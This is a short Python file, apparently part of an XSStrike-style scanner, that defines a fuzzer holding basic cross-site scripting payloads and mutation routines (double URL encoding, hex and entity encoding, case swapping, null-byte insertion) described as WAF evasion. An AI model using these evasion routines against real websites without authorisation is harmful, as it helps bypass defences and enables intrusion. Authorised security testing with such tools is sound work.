import random
import urllib.parse
import string

class Fuzzer:
    """Layer 3: XSStrike Integration (Fuzzer & WAF Evasion)"""
    def __init__(self, payloads=None):
        self.payloads = payloads if payloads else ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
        self.mutations = [
            self.double_url_encode,
            self.hex_encode,
            self.html_entity_encode,
            self.case_swap,
            self.null_byte_insertion
        ]

    def double_url_encode(self, payload):
        return urllib.parse.quote(urllib.parse.quote(payload))

    def hex_encode(self, payload):
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def html_entity_encode(self, payload):
        return "".join(f"&#{ord(c)};" for c in payload)

    def case_swap(self, payload):
        return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    def null_byte_insertion(self, payload):
        return payload.replace("<", "<%00").replace(">", ">%00")

    def mutate_payload(self, payload):
        """Applies a random mutation to a payload for WAF evasion."""
        mutation_func = random.choice(self.mutations)
        return mutation_func(payload)

    def generate_fuzz_payloads(self, base_payloads=None):
        """Generates fuzzed payloads from a list of base payloads."""
        if not base_payloads:
            base_payloads = self.payloads

        fuzzed_payloads = []
        for bp in base_payloads:
            fuzzed_payloads.append(bp)
            fuzzed_payloads.append(self.mutate_payload(bp))

        return list(set(fuzzed_payloads))

if __name__ == "__main__":
    fuzzer = Fuzzer()
    test_payload = "<script>alert(1)</script>"
    print(f"Original: {test_payload}")
    print(f"Mutated: {fuzzer.mutate_payload(test_payload)}")
